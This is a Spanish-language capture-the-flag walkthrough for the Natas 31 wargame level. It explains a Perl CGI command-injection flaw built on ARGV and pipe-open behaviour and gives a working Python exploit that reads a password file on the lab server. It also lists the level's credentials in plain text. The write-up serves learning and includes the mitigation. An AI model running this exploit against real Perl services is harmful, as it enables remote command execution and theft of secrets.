# Natas 31 → 32

## Información del nivel

| Campo | Valor |
|---|---|
| URL | http://natas31.natas.labs.overthewire.org |
| Usuario | natas31 |
| Contraseña | m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y |
| Contraseña obtenida | NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B |

---

## Reconocimiento

La página presenta una herramienta CSV2HTML que sube archivos CSV y los convierte a tablas HTML. El backend está escrito en **Perl**.

---

## Análisis del código fuente

```perl
my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements = split /,/, $_;
        ...
    }
}
```

### Línea por línea

```perl
my $cgi = CGI->new;
```
Crea un objeto CGI para manejar el request.

```perl
if ($cgi->upload('file')) {
```
Verifica que se haya subido un archivo en el campo `file`.

```perl
my $file = $cgi->param('file');
```
Obtiene el valor del parámetro `file`. **Aquí está la sutileza** — si hay múltiples valores para `file`, devuelve el primero.

```perl
while (<$file>) {
```
**Línea vulnerable.** El operador `<$file>` lee línea por línea del filehandle. Internamente usa `open()`, que tiene comportamientos peligrosos en Perl.

---

## Vulnerabilidad: Perl ARGV Magic + Pipe Open

### El comportamiento de `<>` con ARGV

En Perl, el operador `<>` cuando recibe el string literal `"ARGV"` no abre un archivo — itera sobre `@ARGV`, los argumentos de línea de comandos. En CGI, `@ARGV` contiene los **parámetros de la URL**.

```perl
$file = "ARGV";
while (<$file>) { ... }
# Equivalente a leer desde @ARGV
```

### El comportamiento de `open()` con pipes

En Perl, si un filename pasado a `open()` empieza o termina con `|`, **se ejecuta como comando del sistema** en lugar de leerse como archivo:

```perl
open(FH, "comando|")  # ejecuta el comando
```

### La combinación letal

Si conseguimos que:
1. `$file = "ARGV"` (string literal, no filehandle)
2. La URL contenga un parámetro que termine con `|`

Entonces `<$file>` lee desde `@ARGV`, y al pasar cada valor a `open()`, los que terminen con `|` se ejecutan como comandos.

---

## ¿Por qué enviar `file` dos veces?

El código tiene dos verificaciones que necesitamos satisfacer simultáneamente:

| Verificación | Necesita |
|---|---|
| `$cgi->upload('file')` | Un upload **real** (campo file con archivo adjunto) |
| `$cgi->param('file')` | Que devuelva el string `"ARGV"` |

La solución: enviar **dos campos `file`**:
1. Primero un campo de texto con valor `ARGV` → `param('file')` devuelve esto (es el primer valor)
2. Después un upload real → `upload('file')` es verdadero

---

## Camino del payload

**Tu request:**
```
POST /index.pl?cat /etc/natas_webpass/natas32 |
Content-Type: multipart/form-data

file=ARGV          ← campo texto
file=@dummy.csv    ← upload real
```

**En el código Perl:**
```perl
$cgi->upload('file')   # → verdadero (hay upload real)
$cgi->param('file')    # → "ARGV" (primer valor)
```

**Ejecución:**
```perl
$file = "ARGV";
while (<$file>) {
    # Lee desde @ARGV → "cat /etc/natas_webpass/natas32 |"
    # open() detecta el | al final → ejecuta el comando
}
```

El comando `cat /etc/natas_webpass/natas32` se ejecuta y su output se procesa como si fuera el contenido del CSV.

---

## Explotación

```python
import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas31.natas.labs.overthewire.org/index.pl?cat /etc/natas_webpass/natas32 |'
auth = HTTPBasicAuth('natas31', 'm7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y')

# Dos campos file: uno como dato (ARGV) y otro como upload real
data = {'file': 'ARGV'}
files = {'file': ('dummy.csv', 'a,b,c\n1,2,3')}

r = requests.post(url, auth=auth, data=data, files=files)
print(r.text)
```

La contraseña aparece en el `<th>` de la tabla generada.

---

## Comparación con natas29

| Aspecto | natas29 | natas31 |
|---|---|---|
| Vulnerabilidad | `open()` con `\|` directo | `<>` con ARGV + `\|` |
| Payload | `?file=\|cmd` | `?cmd \|` + filename ARGV |
| Filtro | `natas` bloqueado | Sin filtro |
| Bypass | Wildcards `na?as` | Doble parámetro `file` |

natas29 inyecta el comando directamente en el parámetro `file`. natas31 inyecta el comando como parámetro de la URL y le pide a Perl que lea desde `@ARGV` usando el truco del filename `"ARGV"`.

---

## Conceptos clave

- **The Perl Jam 2**: investigación de Black Hat 2016 que documenta vulnerabilidades de Perl en CGI. Ver: https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf
- **`<>` con ARGV**: Perl interpreta `<$file>` cuando `$file = "ARGV"` como leer desde `@ARGV`. Comportamiento heredado de Unix tools.
- **`open()` con pipes**: si el filename empieza o termina con `|`, Perl lo ejecuta como comando. La forma segura es usar `open()` de tres argumentos: `open($fh, '<', $filename)`.
- **Multiple file params**: enviar el mismo campo de formulario dos veces permite que `upload()` sea verdadero pero `param()` devuelva un string controlado.
- **CGI `@ARGV`**: en CGI scripts, los parámetros de la URL se convierten en `@ARGV` para mantener compatibilidad con scripts de línea de comandos.
